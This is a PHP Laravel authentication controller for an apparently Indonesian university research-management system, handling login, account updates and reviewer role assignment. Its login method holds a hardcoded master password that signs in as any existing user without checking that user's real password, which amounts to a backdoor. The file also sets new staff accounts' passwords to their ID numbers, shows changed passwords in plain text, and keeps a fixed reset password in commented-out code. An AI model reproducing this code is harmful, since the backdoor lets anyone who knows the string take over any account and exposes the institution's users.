<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Auth;
use Session;
use Mail;
use App\User;
use App\Jobs\LupaPassword;
use App\Jobs\ResetPassword;
use DB;
use Helpers;
use App\Pegawai;
use Tanggal;
use App\Jobs\KirimEmail;
class AuthController extends Controller
{
    

   

    public function cekLogin(Request $r)
    {

      if (empty($r->username)||$r->username=="") {
         Session::flash('gagal-login','username tidak boleh kosong');
          return redirect('/');
      }
      
      $cek=User::where('username',$r->username)->first();

      if (!$cek) {
        $do=$this->insertUserFromSimpeg($r);
        if (!$do) {
          Helpers::log("username / password salah ",$r->username);
          
          Session::flash('gagal-login','usernmae / password salah /tidak ditemukan');
          return redirect('/');
        }
      }
      
      $cek2=User::where('username',$r->username)->first();      
      if ($cek2 &&$r->password=='sandisaktisimlppm') {
        auth()->login($cek2,false);

       $this->addRemoveRoleReviewer();
       $this->penyesuaianSalahRole();
        if (auth()->user()->jenis_akun=='dosen') {
            return redirect('dashboard-dosen');
        }else{
          return redirect('dashboard');
        }
      }else{

        $login=Auth::attempt(['username'=>$r->username,'password'=>$r->password]);
        // @dd(auth()->user());
        if ($login) {
          $user['id_pelaku']=auth()->user()->username;
          $user['nama_pelaku']=auth()->user()->pegawai->nama;
          $user['user_agent']=$r->server('HTTP_USER_AGENT');
          $user['ip']=$r->ip();
          Session::put('userlogin',$user);
          Helpers::log("login sistem SIMLPPM");
          $this->addRemoveRoleReviewer();
          $this->penyesuaianSalahRole();
            if (auth()->user()->jenis_akun=='dosen') {
              return redirect('dashboard-dosen');
            }else{
              return redirect('dashboard');
            }
        }
        Helpers::log("username / password salah ",$r->username);
        return redirect('/')->with('gagal-login','Username atau password salah, coba lagi');
        
      }
    }
    public function logout()
    {
      auth()->logout();
      session()->flush();
      return redirect('/');
    }
    
    
    public function pengaturanAkun()
    {
      return view('admin.ganti-password.ganti-password-page');
    }

    public  function postPengaturanAkun(Request $request)
    {
      if (isset($request->password_lama)&&isset($request->password_baru)) {
        $cek=password_verify($request->password_lama,auth()->user()->password);
        if (!$cek) {
          Helpers::alert('danger',"Password lama salah!");
          return back();
        }
        if ($request->password_baru!=$request->konfirm_password_baru) {
          Helpers::alert('danger',"Password baru dan konfirmasi password baru tidak sama!");
          return back();
        }

        $a=User::find(auth()->user()->id_user)->update([
          'password'=>bcrypt($request->password_baru),
          'ganti_password'=>0,
          'email'=>$request->email,
          'gelar_depan'=>$request->gelar_depan,
          'gelar_belakang'=>$request->gelar_belakang,
          ]);
        Helpers::alert('success',"Berhasil perbaharui akun  dan ganti password baru menjadi ".$request->password_baru." !");
      }else{
        $a=User::find(auth()->user()->id_user)->update([
          
          'email'=>$request->email,
          'gelar_depan'=>$request->gelar_depan,
          'gelar_belakang'=>$request->gelar_belakang,
          ]);
        Helpers::alert('success',"Berhasil perbaharui akun !");
      }
      
      return back();
    }
    // public function resetPassword(Request $request)
    // {
    //   $cek=Camaru::where('email',$request->email)->orderBy('id_camaru','desc')->first();
    //   if (!$cek) {
    //    return back()->with('alert','Email tidak ditemukan!');
    //   }else{
    //    try{
            
    //         //$password=$this->randomString(5);
    //         //$reset=User::where('id_user',$cek->users_id_biodata)->update(['password'=>bcrypt($password),'password_teks'=>$password]);
            
            
            
    //          dispatch(new LupaPassword($cek));  
    //          Helpers::log($cek->nama_mahasiswa.' Nomor test '.$cek->no_test.' Minta link Reset password '); 
    //         return view('front-page.login.reset-akun');
    //       }
    //       catch (Exception $e){
    //           return back()->with('alert','Gagal mengirim email');
    //           //return response (['status' => false,'errors' => $e->getMessage()]);
    //       }
          
          
    //   }
    // }
    // public function prosesResetPassword($id)
    // {
    //   $cek=Camaru::where('no_test',decrypt($id))->first();
      
    //   if (!$cek) {
    //    return back()->with('alert','user tidak ditemukan!');
    //   }else{
    //     //$pass=explode('-',$cek->tgl_lahir);
    //     $password='30111996';
        
        
    //     $reset=User::where('username',$cek->no_test)->update(['password'=>bcrypt($password)]);

    //     dispatch(new ResetPassword($cek));  
    //    return view('front-page.login.new-akun',compact('cek'));
          
          
    //   }
    // }

   private function penyesuaianSalahRole()
   {
    $cek=DB::table('users_has_roles')
        ->where('user_id',auth()->user()->id_user)
        ->where('role_id',5)->first();
    if ($cek&&strlen(auth()->user()->username)==10) {
      DB::table('users_has_roles')
        ->where('user_id',auth()->user()->id_user)
        ->where('role_id',5)
        ->update([
          'role_id'=>2
        ]);

      User::find(auth()->user()->id_user)
      ->update([
        'jenis_akun'=>'dosen'
      ]);
      $cek3=User::find(auth()->user()->id_user);
      //login ulang
      auth()->login($cek3,false);
    }
   }
    private function insertUserFromSimpeg($r)
    {

      $peg=Pegawai::where('nip',$r->username)->first();
      if (!$peg) {
        return false;    
      }else{
        $tendik=[3,4];
        
        if (in_array($peg->id_jenis_pegawai, $tendik)) $jenis_akun='tendik';
        else $jenis_akun='dosen';
        
        if (strlen($peg->nip)==10)  $jenis_akun='dosen';
        else $jenis_akun='tendik';
          

        $user=User::create([
          'id_peg'=>$peg->id_pegawai,
          'username'=>$peg->nip,
          'password'=>bcrypt($peg->nip),
          'status_akun'=>'aktif',
          'ganti_password'=>1,
          'jenis_akun'=>$jenis_akun

        ]);
        

        if ($jenis_akun=='dosen') {
          $user->roles()->sync([2]);
        }else{
          $user->roles()->sync([5]);
        }

        return true;

      }     

    }

    private  function addRemoveRoleReviewer()
    {
      $ta=Helpers::tahun_anggaran_aktif();
      $cek=DB::table('reviewer_tahun_anggaran')
      ->where('tahun_anggaran_id',$ta->id_tahun_anggaran)
      ->where('pegawai_id',auth()->user()->pegawai->id_pegawai)->first();
      if ($cek) {
        $cek2=DB::table('users_has_roles')
        ->where('user_id',auth()->user()->id_user)
        ->where('role_id',4)->first();
        if (!$cek2) {
          DB::table('users_has_roles')->insert([
            'user_id'=>auth()->user()->id_user,
            'role_id'=>4
          ]);
        }
      }else{
        //hapus role
         $cek2=DB::table('users_has_roles')
        ->where('user_id',auth()->user()->id_user)
        ->where('role_id',4)->first();
        if ($cek2) {
          $cek2=DB::table('users_has_roles')
        ->where('user_id',auth()->user()->id_user)
        ->where('role_id',4)->delete();
        }
      }

    }

    
}
